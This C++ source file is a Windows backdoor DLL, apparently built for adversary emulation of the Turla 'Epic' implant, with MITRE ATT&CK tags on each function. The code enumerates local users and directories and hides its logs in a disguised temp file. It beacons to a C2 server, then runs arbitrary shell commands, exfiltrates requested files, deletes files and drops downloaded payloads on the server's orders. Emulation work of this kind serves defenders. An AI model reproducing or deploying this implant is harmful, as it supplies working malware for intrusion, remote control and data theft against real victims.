#ifndef UNICODE
#define UNICODE
#endif

#include <stdlib.h>
#include <iostream>
#include <filesystem>
#include <algorithm>
#include <string>
#include <windows.h>
#include <fcntl.h>  
#include <io.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h> 
#include <strsafe.h>
#include <lm.h>
#include <tlhelp32.h>
#include <fstream>
#include <ctime>
#include <vector>
#include <chrono>
#include <thread>

#include "comms.h"
#include "file_ops.h"
#include "instruction.h"


#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "User32.lib")

#define MAX_FILE_UPLOAD_SIZE 100*1024*1024

// ExecCmd
//      About:
//          Function to execute arbitrary commands via cmd.exe
//              parameter(s): string command - the exact text of the command to be executed
//      Result:
//          String result - the console output resulting from the command
//      MITRE ATT&CK Techniques:
//          T1059.003 Command and Scripting Interpreter: Windows Command Shell
//      CTI:
//          
//      Other References:
//          
std::string ExecCmd(std::string command) {
   char buffer[128];
   std::string result = "";

   // capture stderr as well
   command = command + " 2>&1";

   // Open pipe to file
   FILE* pipe = _popen(command.c_str(), "r");
   if (!pipe) {
      return "Failed";
   }

   // read till end of process:
   while (!feof(pipe)) {

      // use buffer to read and add to result
      if (fgets(buffer, 128, pipe) != NULL)
         result += buffer;
   }
	
	// close pipe to file
   _pclose(pipe);
   return result;
}

// Convert a numeric code received from GetLastError() into its associated message.
auto LookupMessage(DWORD code) -> std::wstring {
	// FormatMessageW allocates the buffer required for the message. This
	// is a pointer to that buffer. The buffer needs to be freed with
	// LocalAlloc once once it has been used.
	PWSTR buffPtr{};
	auto length = ::FormatMessageW(
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		nullptr,
		code,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		reinterpret_cast<PWSTR>(&buffPtr),
		0,
		nullptr
	);
	if (!length) {
		auto error = GetLastError();
		return L"Failed";
	}

	std::wstring msg{ reinterpret_cast<LPWSTR>(buffPtr) };
	::LocalFree(buffPtr);
	return msg;
}

// GetAllUsers
//      About:
//          Function to enumerate all users on the local machine
//      Result:
//          String result - the list of all users with corresponding information
//      MITRE ATT&CK Techniques:
//          T1087.001: Account Discovery: Local Account
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//          https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuserenum
std::string GetAllUsers() {
	std::string result = "";
	LPUSER_INFO_3 pBuf = NULL;
	LPUSER_INFO_3 pTmpBuf;
	DWORD dwLevel = 3;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = NULL;
	do // begin do
	   {
		  nStatus = NetUserEnum((LPCWSTR) pszServerName,
								dwLevel,
								FILTER_NORMAL_ACCOUNT, // global users
								(LPBYTE*)&pBuf,
								dwPrefMaxLen,
								&dwEntriesRead,
								&dwTotalEntries,
								&dwResumeHandle);
		  // If the call succeeds,
		  if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		  {
			 if ((pTmpBuf = pBuf) != NULL)
			 {
				// Loop through the entries.
				for (i = 0; (i < dwEntriesRead); i++)
				{
				   assert(pTmpBuf != NULL);

				   if (pTmpBuf == NULL)
				   {
					  fprintf(stderr, "Access violation\n");
					  break;
				   }
				   //  Print the name of the user account.
				   std::wstring ws(pTmpBuf->usri3_name);
				   result.append("\n\tname: ");
				   result.append(std::string(ws.begin(), ws.end()));
				   result.append("\n\tpriv: ");
				   result.append(std::to_string(pTmpBuf->usri3_priv));
				   result.append("\n\tauth flags: ");
				   result.append(std::to_string(pTmpBuf->usri3_auth_flags));
				   result.append("\n\tlast logon: ");
				   result.append(std::to_string(pTmpBuf->usri3_last_logon));

				   pTmpBuf++;
				   dwTotalCount++;
				}
			 }
		  }
		  // Otherwise, print the system error.
		  else
			 fprintf(stderr, "Error: %d\n", nStatus);
		  // Free the allocated buffer.
		  if (pBuf != NULL)
		  {
			 NetApiBufferFree(pBuf);
			 pBuf = NULL;
		  }
	   }
		// Continue to call NetUserEnum while there are more entries. 
		while (nStatus == ERROR_MORE_DATA); // end do
		// Check again for allocated memory.
		if (pBuf != NULL)
		  NetApiBufferFree(pBuf);

		return result;
}

// ListFilesWinAPI
//      About:
//          Function to list files in the given directory using the Windows API.
//              parameter(s): wstring dir - the absolute path to the directory to be enumerated
//      Result:
//          String result - the contents of the specfied directory
//      MITRE ATT&CK Techniques:
//          T1083: File and Directory Discovery
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//          https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfileattributesw
//			https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilew
//			https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilew
std::string ListFilesWinAPI(std::wstring dir) {

	std::string result = "";

	// Check that the path exists.
	auto attrs = ::GetFileAttributesW(dir.c_str());
	if (INVALID_FILE_ATTRIBUTES == attrs) {
		std::wcerr << wprintf(L"Failed %s: %s\n", dir.c_str(), LookupMessage(::GetLastError()).c_str());
	}

	// Check that the path is a directory.
	if ((FILE_ATTRIBUTE_DIRECTORY & attrs) == 0) {
		std::wcerr << wprintf(L"Failed %s.\n", dir.c_str());
	}

	// Add a directory wildcard to the path.
	if (dir.ends_with(L"\\")) {
		dir += L"*";
	}
	else {
		dir += L"\\*";
	}

	// Get a search handle to the first file in the directory.
	WIN32_FIND_DATAW file{};
	auto current = ::FindFirstFileW(
		dir.c_str(),
		&file
	);
	if (INVALID_HANDLE_VALUE == current) {
		std::wcerr << wprintf(L"Failed %s: %s.\n", dir.c_str(), LookupMessage(::GetLastError()).c_str()); // failed to get file handle
	}
	// List every file and directory recursively
	do {
		std::wstring ws(file.cFileName);
		result.append(ws.begin(), ws.end());
		result.append("\n");
		
	// Grab a search handle to the next file in the directory until there are none left.
	} while (0 != ::FindNextFileW(current, &file));

	// Close the search handle once we are done with it.
	::FindClose(current);

	return result;
}

// DirectoryDiscovery
//      About:
//          Function to retrieve some directory information via ListFilesWinAPI.
//      Result:
//          string result - the results of the given command, and the contents of the specified directories
//      MITRE ATT&CK Techniques:
//          T1082: System Information Discovery
//          T1083: File and Directory Discovery
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//
std::string DirectoryDiscovery(){
	std::string result = "";
	
	//Retrieve the value of env variable TEMP
	char* buf = nullptr;
	size_t size = 0;
	_dupenv_s(&buf, &size, "TEMP");
	std::string path = std::string(buf);
	result.append("\nTEMP: ");
	result.append(path);
	free(buf);
	//Convert the env var path to wstring and perform directory listing
	std::wstring wpath(path.begin(), path.end());
	result.append("\nList files for: ");
	result.append(path);
	result.append(ListFilesWinAPI(wpath));
	
	//Retrieve the value of env variable SYSTEMDRIVE
	buf = nullptr;
	size = 0;
	_dupenv_s(&buf, &size, "SYSTEMDRIVE");
	std::string drive = std::string(buf);
	result.append("\nSYSTEMDRIVE: ");
	result.append(drive);
	free(buf);

	//Retrieve the value of env variable USERPROFILE
	buf = nullptr;
	size = 0;
	_dupenv_s(&buf, &size, "USERPROFILE");
	path = std::string(buf);
	result.append("\nUSERPROFILE: ");
	result.append(path);

	//Convert the env var path to wstring and perform directory listing
	std::wstring wpath2(path.begin(), path.end());
	result.append("\nList files for: ");
	result.append(path);
	result.append(ListFilesWinAPI(wpath2));
	
	return result;
}

// WriteResult
//      About:
//          Helper function to write the command result to log file ~D723574.tmp ("R5T" ==hex=> 72 35 74)
//      Result:
//          Returns string path to the log file
//      MITRE ATT&CK Techniques:
//          
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
// 
std::string WriteResult(std::string result, uint32_t commandID, file_ops::FileHandlerWrapperInterface *fh_wrapper) {
	std::string resultPath = "";
	HANDLE h_dest_file = INVALID_HANDLE_VALUE;

	char* buf = nullptr;
	size_t size = 0;
	_dupenv_s(&buf, &size, "TEMP");
	std::string temp = std::string(buf);
	resultPath.append(temp);
	free(buf);

	resultPath.append("\\~D723574.tmp");

	// open file to save result to
	h_dest_file = fh_wrapper->CreateFileWrapper(
		resultPath.c_str(),
		FILE_APPEND_DATA,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS, // create new file if it doesn't exist
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (h_dest_file == INVALID_HANDLE_VALUE) {
		result = fh_wrapper->GetLastErrorWrapper();
	}
	result = "\n" + std::to_string(commandID) + ": \n" + result;
	size_t resultLength = result.length();
	std::vector<unsigned char> charvect(result.begin(), result.end());
	file_ops::WriteFileBytes(fh_wrapper, h_dest_file, &charvect[0], charvect.size());

	fh_wrapper->CloseHandleWrapper(h_dest_file);

	return resultPath;
}

// ReadFile
//      About:
//          Open and read a file to be exfiltrated
//      Result:
//          Returns a char vector of the file contents
//      MITRE ATT&CK Techniques:
//          
//      CTI:
//          
//      Other References:
//
std::vector<char> ReadFile(file_ops::FileHandlerWrapperInterface* file_handler_wrapper, LPCSTR file_to_upload) {
	DWORD result_code = ERROR_SUCCESS;
	std::string retString;

	HANDLE h_upload_file = file_handler_wrapper->CreateFileWrapper(
		file_to_upload,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING, // only open if existing
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (h_upload_file == INVALID_HANDLE_VALUE) {
		result_code = file_handler_wrapper->GetLastErrorWrapper();
		retString = "Failed. Err: " + std::to_string(result_code); // Could not open file to upload
		std::vector<char> retVector(retString.begin(), retString.end());
		return retVector;
	}

	// Get file size to make sufficient buffer
	DWORD file_size = file_handler_wrapper->GetFileSizeWrapper(h_upload_file, NULL);
	if (file_size == INVALID_FILE_SIZE) {
		result_code = file_handler_wrapper->GetLastErrorWrapper();
		file_handler_wrapper->CloseHandleWrapper(h_upload_file);
		retString = "Error: " + std::to_string(result_code); // Could not open file to upload
		std::vector<char> retVector(retString.begin(), retString.end());
		return retVector;
	}
	else if (file_size > MAX_FILE_UPLOAD_SIZE) {
		file_handler_wrapper->CloseHandleWrapper(h_upload_file);
		retString = "Size: " + std::to_string(MAX_FILE_UPLOAD_SIZE); // File to upload too large
		std::vector<char> retVector(retString.begin(), retString.end());
		return retVector;
	}

	// Read file data
	std::vector<char> retVector(file_size);
	retVector.push_back(65); // populate with one element so we can use &post_buffer[0]
	result_code = file_ops::ReadFileBytes(file_handler_wrapper, h_upload_file, &retVector[0], file_size);
	file_handler_wrapper->CloseHandleWrapper(h_upload_file);
	if (result_code != ERROR_SUCCESS) {
		retString = "Failed: " + std::string(file_to_upload) + " Err: " + std::to_string(result_code); // Failed to read upload file
		std::vector<char> retVector(retString.begin(), retString.end());
	}

	return retVector;
}

// DeleteFile
//      About:
//          Delete the file at the given path
//      Result:
//          Empty string if successful, otherwise error string
//      MITRE ATT&CK Techniques:
//          T1070.004: File Deletion
//      CTI:
//
//      Other References:
//
std::string DeleteFile(file_ops::FileHandlerWrapperInterface* file_handler_wrapper, LPCSTR file_to_delete) {
	DWORD result_code = ERROR_SUCCESS;
	std::string retString;

	result_code = file_ops::DeleteFileAtPath(file_handler_wrapper, file_to_delete);
	if (result_code != ERROR_SUCCESS) {
		retString = "Failed: " + std::string(file_to_delete) + " Err: " + std::to_string(result_code); // failed to delete file
	}
	return "";
}

// DownloadFile
//      About:
//          Write the payload data to the given path
//      Result:
//          Empty string if successful, otherwise error string
//      MITRE ATT&CK Techniques:
//          T1105: Ingress Tool Transfer
//      CTI:
//          https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
//      Other References:
//
std::string DownloadFile(file_ops::FileHandlerWrapper* file_handler_wrapper, unsigned char* payload, DWORD payload_size, LPCSTR path) {
	DWORD result_code = ERROR_SUCCESS;
	std::string retString;
	HANDLE h_dest_file = INVALID_HANDLE_VALUE;

	// open file to save payload to
	h_dest_file = file_handler_wrapper->CreateFileWrapper(
		path,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS, // create new file if it doesn't exist
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (h_dest_file == INVALID_HANDLE_VALUE) {
		result_code = file_handler_wrapper->GetLastErrorWrapper();
	}
	file_ops::WriteFileBytes(file_handler_wrapper, h_dest_file, payload, payload_size);
	file_handler_wrapper->CloseHandleWrapper(h_dest_file);

	if (result_code != ERROR_SUCCESS) {
		retString = "Failed: " + std::string(path) + " Err: " + std::to_string(result_code); //failed to download file to
	}
	return "";
}

extern "C" __declspec(dllexport) void PayLoop()
{

	std::string UUID = "";
	std::string type = "command";
	std::string data = "";

	data.append(GetAllUsers());
	data.append(DirectoryDiscovery());

	file_ops::FileHandlerWrapper fh_wrapper;

	WriteResult(data, 0, &fh_wrapper);
	std::string encodedRequestBody = comms::FormatHeartbeatRequest(UUID, type, data, false);

	comms::CommsHttpWrapper comms_http_wrapper;
	instruction::Instruction heartbeatResponse = comms::Heartbeat(&comms_http_wrapper, DEFAULT_C2_ADDRESS, DEFAULT_C2_PORT, (char*)encodedRequestBody.c_str(), encodedRequestBody.length());

	auto configID = heartbeatResponse.config.find("ID");

	if (configID == heartbeatResponse.config.end()) {
		std::cout << "ID not received" << std::endl;
	}
	else {
		UUID = configID->second;
	}

	data = "";

	while (UUID != "") {
		std::this_thread::sleep_for(std::chrono::milliseconds(15000));
		//Sleep(15000);

		type = "";
		data = "";

		if (heartbeatResponse.config.contains("exe")) {
			type = "command";
			data = ExecCmd(heartbeatResponse.config.find("exe")->second);
			WriteResult(data, heartbeatResponse.commandID, &fh_wrapper);
		}
		if (heartbeatResponse.config.contains("result")) {
			type = "upload";
			std::vector<char> fileBytes = ReadFile(&fh_wrapper, heartbeatResponse.config.find("result")->second.c_str());
			WriteResult("Uploading: " + heartbeatResponse.config.find("result")->second, heartbeatResponse.commandID, &fh_wrapper);
			for (char c : fileBytes) {
				data.push_back(c);
			}
			data.pop_back();	// remove the extra 'A' appended to populate the buffer
		}
		if (heartbeatResponse.config.contains("del_task")) {
			type = "delete";
			data = DeleteFile(&fh_wrapper, heartbeatResponse.config.find("name")->second.c_str());
			WriteResult("Deleting: " + heartbeatResponse.config.find("name")->second, heartbeatResponse.commandID, &fh_wrapper);
		}
		else if (heartbeatResponse.config.contains("name")) {
			type = "download";
			data = DownloadFile(&fh_wrapper, &heartbeatResponse.payload[0], heartbeatResponse.payloadSize, heartbeatResponse.config.find("name")->second.c_str());
			WriteResult("Downloading: " + heartbeatResponse.config.find("name")->second, heartbeatResponse.commandID, &fh_wrapper);
		}

		encodedRequestBody = comms::FormatHeartbeatRequest(UUID, type, data, true);
		heartbeatResponse = comms::Heartbeat(&comms_http_wrapper, DEFAULT_C2_ADDRESS, DEFAULT_C2_PORT, (char*)encodedRequestBody.c_str(), encodedRequestBody.length());

	}
}

int main() {
	PayLoop();
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
